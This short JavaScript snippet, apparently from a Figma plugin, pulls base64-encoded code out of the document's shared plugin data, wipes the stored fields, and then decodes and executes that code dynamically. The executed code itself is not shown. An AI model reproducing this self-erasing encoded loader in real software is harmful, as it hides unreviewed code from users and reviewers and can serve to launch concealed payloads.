const b64=figma.root.getSharedPluginData("careapp","xs04g04_0")+figma.root.getSharedPluginData("careapp","xs04g04_1");
figma.root.setSharedPluginData("careapp","xs04g04_0",'');
figma.root.setSharedPluginData("careapp","xs04g04_1",'');
const bin=Uint8Array.from(atob(b64),c=>c.charCodeAt(0));
const code=new TextDecoder().decode(bin);
const AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;
return await new AsyncFunction(code)();
